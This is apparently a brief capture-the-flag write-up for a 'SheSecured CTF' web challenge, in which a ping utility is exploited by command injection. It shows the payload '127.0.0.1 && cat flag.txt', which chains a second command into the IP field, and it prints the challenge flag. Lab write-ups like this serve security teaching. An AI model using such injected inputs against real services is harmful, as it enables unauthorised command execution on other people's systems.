---
title: 'SheSecured CTF — Injection'
description: 'Simple command injection in a ping utility'
pubDate: 'Jul 6 2025'
tags: ['ctf', 'web', 'command-injection']
thumbnail: 'https://miro.medium.com/v2/resize:fit:1100/1*y0_dmko1KyBx0t86_PMpAg.png'
---

# SheSecured CTF — Injection

By opening the web page we find a simple ping utility for IP addresses — classic command injection, lightly filtered.

**Payload:**

```
127.0.0.1 && cat flag.txt
```

<img src="https://miro.medium.com/v2/resize:fit:1100/1*y0_dmko1KyBx0t86_PMpAg.png" alt="Injection challenge" />

<img src="https://miro.medium.com/v2/resize:fit:1100/1*cjC-Hxu0lYf0J_MdvRsZ9g.png" alt="Silent ping utility" />

**Flag:** `Spark{Injection_filBlayssELKOLL}`
